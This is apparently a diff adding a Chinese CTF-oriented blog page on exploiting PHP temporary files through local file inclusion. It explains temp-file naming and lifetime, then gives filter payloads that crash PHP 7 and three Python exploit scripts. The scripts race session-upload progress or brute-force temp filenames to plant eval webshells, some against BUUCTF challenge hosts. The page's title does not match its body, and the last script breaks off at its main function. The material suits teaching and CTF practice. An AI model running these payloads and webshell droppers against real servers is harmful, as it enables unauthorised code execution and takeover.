@@ -1,0 +1,729 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/Decemberus.github-io/img/fluid.png">
+  <link rel="icon" href="/Decemberus.github-io/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Decemberus">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="PHP临时文件机制与利用的思考PHPLFIPHP LFI本地文件包含漏洞主要是包含本地服务器上存储的一些文件，例如session文件、日志文件、临时文件等。但是，只有我们能够控制包含的文件存储我们的恶意代码才能拿到服务器权限。 假如在服务器上找不到我们可以包含的文件，那该怎么办，此时可以通过利用一些技巧让服务存储我们恶意生成的临时文件，该临时文件包含我们构造的的恶意代码，此时服务器就存在我们可以包">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP变量覆盖漏洞">
+<meta property="og:url" content="https://decemberus.github.io/Decemberus.github-io/2022/02/19/PHP%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E6%9C%BA%E5%88%B6%E4%B8%8E%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%9D%E8%80%83/index.html">
+<meta property="og:site_name" content="欢迎回来">
+<meta property="og:description" content="PHP临时文件机制与利用的思考PHPLFIPHP LFI本地文件包含漏洞主要是包含本地服务器上存储的一些文件，例如session文件、日志文件、临时文件等。但是，只有我们能够控制包含的文件存储我们的恶意代码才能拿到服务器权限。 假如在服务器上找不到我们可以包含的文件，那该怎么办，此时可以通过利用一些技巧让服务存储我们恶意生成的临时文件，该临时文件包含我们构造的的恶意代码，此时服务器就存在我们可以包">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="d:/mdimage/t011f9d1089d0559dd4.png">
+<meta property="og:image" content="d:/mdimage/image-20221011194917889.png">
+<meta property="og:image" content="d:/mdimage/t018e8f64ce52f4be7f.png">
+<meta property="og:image" content="d:/mdimage/t015a2d67e3293214bc.png">
+<meta property="og:image" content="d:/mdimage/t01faaa80caff6c36c7.png">
+<meta property="og:image" content="d:/mdimage/t01f616deba6a4cfb62.png">
+<meta property="og:image" content="d:/mdimage/t01610a5c5cd09be792.png">
+<meta property="og:image" content="d:/mdimage/t01aa94dbe78929b207.png">
+<meta property="article:published_time" content="2022-02-19T04:26:18.000Z">
+<meta property="article:modified_time" content="2023-03-27T15:06:48.001Z">
+<meta property="article:author" content="Decemberus">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="d:/mdimage/t011f9d1089d0559dd4.png">
+  
+  
+  <title>PHP变量覆盖漏洞 - 欢迎回来</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/Decemberus.github-io/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/Decemberus.github-io/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/Decemberus.github-io/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"decemberus.github.io","root":"/Decemberus.github-io/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/Decemberus.github-io/local-search.xml"};
+  </script>
+  <script  src="/Decemberus.github-io/js/utils.js" ></script>
+  <script  src="/Decemberus.github-io/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/Decemberus.github-io/">
+      <strong>enjoy的blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Decemberus.github-io/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Decemberus.github-io/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Decemberus.github-io/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Decemberus.github-io/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Decemberus.github-io/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/Decemberus.github-io/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="PHP变量覆盖漏洞"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-02-19 12:26" pubdate>
+          2022年2月19日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          57 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">PHP变量覆盖漏洞</h1>
+            
+            <div class="markdown-body">
+              
+              <h1 id="PHP临时文件机制与利用的思考"><a href="#PHP临时文件机制与利用的思考" class="headerlink" title="PHP临时文件机制与利用的思考"></a>PHP临时文件机制与利用的思考</h1><h1 id="PHPLFI"><a href="#PHPLFI" class="headerlink" title="PHPLFI"></a>PHPLFI</h1><p>PHP LFI本地文件包含漏洞主要是包含本地服务器上存储的一些文件，例如session文件、日志文件、临时文件等。但是，只有我们能够控制包含的文件存储我们的恶意代码才能拿到服务器权限。</p>
+<p>假如在服务器上找不到我们可以包含的文件，那该怎么办，此时可以通过利用一些技巧让服务存储我们恶意生成的临时文件，该临时文件包含我们构造的的恶意代码，此时服务器就存在我们可以包含的文件。</p>
+<p>目前，常见的两种临时文件包含漏洞利用方法主要是：<code>PHPINFO()</code> and <code>PHP7 Segment Fault</code>，利用这两种奇技淫巧可以向服务器上传文件同时在服务器上生成恶意的临时文件，然后将恶意的临时文件包含就可以达到任意代码执行效果也就可以拿到服务器权限进行后续操作。</p>
+<h1 id="了解PHP临时文件"><a href="#了解PHP临时文件" class="headerlink" title="了解PHP临时文件"></a>了解PHP临时文件</h1><p>在PHP中可以使用POST方法或者PUT方法进行文本和二进制文件的上传。<br>上传后会文件会保存在全局变量$_FILES里，该数组包含了所有上传文件的文件信息。</p>
+<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs inform7">$_FILES<span class="hljs-comment">[‘userfile’]</span><span class="hljs-comment">[‘name’]</span> 客户端文件的原名称。<br>$_FILES<span class="hljs-comment">[‘userfile’]</span><span class="hljs-comment">[‘type’]</span> 文件的 MIME 类型，如果浏览器提供该信息的支持，例如”image/gif”。<br>$_FILES<span class="hljs-comment">[‘userfile’]</span><span class="hljs-comment">[‘size’]</span> 已上传文件的大小，单位为字节。<br>$_FILES<span class="hljs-comment">[‘userfile’]</span><span class="hljs-comment">[‘tmp_name’]</span> 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，默认是/tmp目录。<br>$_FILES<span class="hljs-comment">[‘userfile’]</span><span class="hljs-comment">[‘error’]</span> 该文件上传的错误代码，上传成功其值为0，否则为错误信息。<br>$_FILES<span class="hljs-comment">[‘userfile’]</span><span class="hljs-comment">[‘tmp_name’]</span> 文件被上传后在服务端存储的临时文件名<br></code></pre></td></tr></table></figure>
+
+<p>这里的重点就是<code>$_FILES[‘userfile’][‘tmp_name’]</code> 这个变量。</p>
+<h2 id="临时文件的存储目录"><a href="#临时文件的存储目录" class="headerlink" title="临时文件的存储目录"></a>临时文件的存储目录</h2><p>文件被上传后，默认会被存储到服务端的默认临时目录中，该临时目录由php.ini的upload_tmp_dir属性指定，假如upload_tmp_dir的路径不可写，PHP会上传到系统默认的临时目录中，假如开启了open_basedir，要想成功上传，系统默认临时目录需要指定PHP可访问。</p>
+<p>在wamp中，upload_tmp_dir属性默认为wamp安装目录下的tmp文件夹：</p>
+<p><img src="D:\mdimage\t011f9d1089d0559dd4.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="wamp临时目录"> </p>
+<blockquote>
+<p>WAMP是Windows下的Apache+Mysql&#x2F;MariaDB+Perl&#x2F;PHP&#x2F;Python的缩写</p>
+</blockquote>
+<p>在Centos7中，upload_tmp_dir没有指定，所以会使用系统默认临时目录，这里是&#x2F;tmp目录，该属性可以通过sys_get_temp_dir()函数来获得</p>
+<p><img src="D:\mdimage\image-20221011194917889.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20221011194917889"> </p>
+<h2 id="临时文件的命名规则"><a href="#临时文件的命名规则" class="headerlink" title="临时文件的命名规则"></a>临时文件的命名规则</h2><p>在上传存储到临时目录后，临时文件命名的规则如下:</p>
+<p>默认为 php+4或者6位随机数字和大小写字母</p>
+<p>php[0-9A-Za-z]{3,4,5,6}</p>
+<p>比如 ：phpXXXXXX.tmp 在windows下有tmp后缀，linux没有。</p>
+<p>windows下，在windows环境中，php会调用GetTempFileName方法，具体定义在源码的php_open_temporary_file.c中</p>
+<p><img src="D:\mdimage\t018e8f64ce52f4be7f.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="windows文件命名"> </p>
+<p>在linux下则是适用mkstemp方法，此方法依赖于glibc的编译方式，通常生成6位随机数，范围为62（A-Za-z0-9）</p>
+<p><img src="D:\mdimage\t015a2d67e3293214bc.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="linux下文件名"> </p>
+<p><img src="D:\mdimage\t01faaa80caff6c36c7.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="linux下文件命名"> </p>
+<h2 id="临时文件的正常存活周期"><a href="#临时文件的正常存活周期" class="headerlink" title="临时文件的正常存活周期"></a>临时文件的正常存活周期</h2><p><img src="D:\mdimage\t01f616deba6a4cfb62.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="临时文件正常的存货周期"> </p>
+<p>上面这张图是PHP在通过POST方法上传文件时的运行周期图，可以看到我们临时文件的存活周期就是上图红色框中的时间段。另外，如果在php运行的过程中，假如php非正常结束，比如崩溃，那么这个临时文件就会永久的保留。如果php正常的结束，并且该文件没有被移动到其它地方也没有被改名，则该文件将在表单请求结束时被删除。</p>
+<h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><p>既然了解了PHP上传会产生临时文件，并且文件内容可控，那我们就不禁要思考思考，这里有没有存在可以利用的点呢？</p>
+<p>这就有以下几个问题：</p>
+<h2 id="问题一：如何能够访问到该临时文件？"><a href="#问题一：如何能够访问到该临时文件？" class="headerlink" title="问题一：如何能够访问到该临时文件？"></a>问题一：如何能够访问到该临时文件？</h2><p>由于临时文件目录一般不可访问，因此想要利用临时文件一般需要配合文件包含，或者某些ssrf结合包含来进行利用。</p>
+<h2 id="问题二：如何获得临时文件的文件名？"><a href="#问题二：如何获得临时文件的文件名？" class="headerlink" title="问题二：如何获得临时文件的文件名？"></a>问题二：如何获得临时文件的文件名？</h2><p>1.在前面介绍过临时文件的命名规则，因此，当我们获得了一个文件包含点时，可以通过暴力猜解文件名来得到。这时最朴素，最笨拙的方法，但也是最有效的方法。</p>
+<p>2.在windows中，利用了FindFirstFile方法，可以通过通配符来进行文件包含，在linux中也有相应的一些方法。</p>
+<p>3.第三种方法就是通过&#x2F;proc&#x2F;self&#x2F;fd&#x2F;xxx来获得，xxx从10开始，这里获得的时当前运行进程ID的一些符号链接，这个方式的有效性取决于上传文件的大小，大文件可以增加尝试的时间。</p>
+<p>获得文件名的方法应该有很多，这里只列举最笨拙的几种</p>
+<h2 id="如何在php运行时间内包含到该临时文件？"><a href="#如何在php运行时间内包含到该临时文件？" class="headerlink" title="如何在php运行时间内包含到该临时文件？"></a>如何在php运行时间内包含到该临时文件？</h2><p>1.本地文件包含可以让php包含自身从而导致死循环，然后php守护进程产生内存溢出，然后php会崩溃，php自身是不会因为错误直接退出的，它会清空自己的内存堆栈，以便从错误中恢复，这就保证了web服务的正常运转的同时，打断了php对临时文件的处理，在这个时候对任一php文件进行post文件请求，临时文件就会被保留。</p>
+<p>正常的执行流程应该如下图所示：</p>
+<p><img src="D:\mdimage\t01610a5c5cd09be792.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="正常执行流程"> </p>
+<p>而在漏洞利用过程中：</p>
+<p><img src="D:\mdimage\t01aa94dbe78929b207.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="漏洞利用流程"> </p>
+<p>因此临时目录下的临时文件有部分得以保存，再通过包含这部分文件即可getshell。</p>
+<h2 id="php-x2F-x2F-filter-x2F-string-strip-tags"><a href="#php-x2F-x2F-filter-x2F-string-strip-tags" class="headerlink" title="php:&#x2F;&#x2F;filter&#x2F;string.strip_tags"></a>php:&#x2F;&#x2F;filter&#x2F;string.strip_tags</h2><p>php7.0的bug</p>
+<p>payload如下，在有文件包含的文件下用</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">include.php?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/string.strip_tags/</span>resource=<span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure>
+
+<p>使用php:&#x2F;&#x2F;filter&#x2F;string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破就可以getshell</p>
+<p>该方法仅适用于以下php7版本，php5并不存在该崩溃：</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">• php<span class="hljs-number">7.0.0-7</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>可以利用， <span class="hljs-number">7</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>x版本的已被修复<br><br>• php<span class="hljs-number">7.1.3-7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">1</span>可以利用， <span class="hljs-number">7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">1</span>x版本的已被修复<br><br>• php<span class="hljs-number">7.2.2-7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">8</span>可以利用， <span class="hljs-number">7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">9</span>一直到<span class="hljs-number">7</span>.<span class="hljs-number">3</span>到现在的版本已被修复<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="convert-quoted-printable-encode"><a href="#convert-quoted-printable-encode" class="headerlink" title="convert.quoted-printable-encode"></a>convert.quoted-printable-encode</h2><p>3.利用wupco师傅发现的filter:<code>convert.quoted-printable-encode</code>导致的segment fault。实际上，这个崩溃并不适用于include，require等函数，经过测试，该方法适用于以下版本（201812月以前的版本，由于师傅提交了因此之后的版本修复了，tql）的以下函数（file函数，file_get_contents函数，readfile函数）：</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">• php<span class="hljs-number">7.0.0-7</span>.<span class="hljs-number">0</span>.<span class="hljs-number">32</span><br><br>• php<span class="hljs-number">7.0.4-7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">12</span><br><br>• php&lt;=<span class="hljs-number">5</span>.<span class="hljs-number">6</span>.<span class="hljs-number">38</span>的版本<br></code></pre></td></tr></table></figure>
+
+<p>这里要说明下5.6.39-5.6.9以内的版本并不存在这个崩溃</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">php:</span>//<span class="hljs-keyword">filter</span>/convert.quoted-printable-encode/resource<span class="hljs-operator">=</span>data://<span class="hljs-punctuation">,</span><span class="hljs-variable">%bfAAAAAAAAAAAAAAAAAAAAAAA</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ffAAAAAAAAAAAAAAAAAAAAAAAA</span><br></code></pre></td></tr></table></figure>
+
+<p>例题的话可以去看buu上找npu又个叫ezclude的题</p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/183046?from=groupmessage">PHP临时文件机制与利用的思考-安全客 - 安全资讯平台 (anquanke.com)</a></p>
+<h1 id="实战攻击"><a href="#实战攻击" class="headerlink" title="实战攻击"></a>实战攻击</h1><h2 id="session对话进行文件包含"><a href="#session对话进行文件包含" class="headerlink" title="session对话进行文件包含"></a>session对话进行文件包含</h2><p>向PHP发送含有文件区块的数据包时，让PHP异常崩溃退出，POST的临时文件就会被保留</p>
+<p>大佬的写入shell脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><br>host = <span class="hljs-string">&#x27;http://de198dd7-5ee5-4fae-a188-83bc584d65a9.node4.buuoj.cn:81/flflflflag.php&#x27;</span><br>sessid = <span class="hljs-string">&#x27;vrh&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">POST</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        f = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)<br>        session.post(<br>            host,<br>            data=&#123;<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="hljs-string">&quot;&lt;?php system(&#x27;cat *&#x27;);fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;);echo md5(&#x27;1&#x27;);?&gt;&quot;</span>&#125;,<br>            files=&#123;<span class="hljs-string">&quot;file&quot;</span>:(<span class="hljs-string">&#x27;a.txt&#x27;</span>, f)&#125;,<br>            cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;<br>        )<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">READ</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        response = session.get(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;host&#125;</span>?file=/tmp/sess_<span class="hljs-subst">&#123;sessid&#125;</span>&#x27;</span>)<br>        <span class="hljs-comment"># print(response.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> response.text:<br>        <span class="hljs-comment"># if &#x27;flag&#x27; not in response.text:</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+++]retry&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(response.text)<br>            sys.exit(<span class="hljs-number">0</span>)<br><br><br><span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>    t1 = threading.Thread(target=POST, args=(session, ))<br>    t1.daemon = <span class="hljs-literal">True</span><br>    t1.start()<br>    READ(session)<br><br></code></pre></td></tr></table></figure>
+
+<h2 id="php7-segment-fault"><a href="#php7-segment-fault" class="headerlink" title="php7 segment fault"></a>php7 segment fault</h2><p>向PHP发送含有文件区块的数据包时，让PHP异常崩溃退出，POST的临时文件就会被保留</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">import requests<br><span class="hljs-keyword">from</span> io import BytesIO<br>url=<span class="hljs-string">&quot;http://f0af8aa4-9e9c-40a8-9003-175dbc6f69f8.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span><br>payload=<span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span><br>files=&#123;<br>    <span class="hljs-string">&quot;file&quot;</span>:<span class="hljs-title function_ invoke__">BytesIO</span>(payload.<span class="hljs-title function_ invoke__">encode</span>())<br>&#125;<br>r=requests.<span class="hljs-title function_ invoke__">post</span>(url=url,files=files,allow_redirects=False)<br><br><span class="hljs-keyword">print</span>(r.text)<br><br></code></pre></td></tr></table></figure>
+
+<p>找到文件包含的地方，写文件，爆破临时文件名，写入shell</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">向PHP发送含有文件区块的数据包时，让PHP异常崩溃退出，<span class="hljs-keyword">POST</span>的临时文件就会被保留<br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linuxsec/articles/11278477.html">具体原理在这里</a>    </p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46081055/article/details/120204436?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.no_search_link&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.no_search_link">那两种新方式的例题在这呀</a></p>
+<p>或者也可以用下面这一个组合</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> itertools<br><br>charset = string.digits + string.letters<br><br>host = <span class="hljs-string">&quot;192.168.43.155&quot;</span><br>port = <span class="hljs-number">80</span><br>base_url = <span class="hljs-string">&quot;http://%s:%d&quot;</span> % (host, port)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_file_to_include</span>(<span class="hljs-params">url, file_content</span>):<br>    files = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;evil.jpg&#x27;</span>, file_content, <span class="hljs-string">&#x27;image/jpeg&#x27;</span>)&#125;<br>    <span class="hljs-keyword">try</span>:<br>        response = requests.post(url, files=files)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span> e<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_tmp_files</span>():<br>    webshell_content = <span class="hljs-string">&#x27;&lt;?php eval($_REQUEST[c]);?&gt;&#x27;</span>.encode(<br>        <span class="hljs-string">&quot;base64&quot;</span>).strip().encode(<span class="hljs-string">&quot;base64&quot;</span>).strip().encode(<span class="hljs-string">&quot;base64&quot;</span>).strip()<br>    file_content = <span class="hljs-string">&#x27;&lt;?php if(file_put_contents(&quot;/tmp/ssh_session_HD89q2&quot;, base64_decode(&quot;%s&quot;)))&#123;echo &quot;flag&quot;;&#125;?&gt;&#x27;</span> % (<br>        webshell_content)<br>    phpinfo_url = <span class="hljs-string">&quot;%s/include.php?f=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span> % (<br>        base_url)<br>    length = <span class="hljs-number">6</span><br>    times = <span class="hljs-built_in">len</span>(charset) ** (length / <span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(times):<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] %d / %d&quot;</span> % (i, times)<br>        upload_file_to_include(phpinfo_url, file_content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    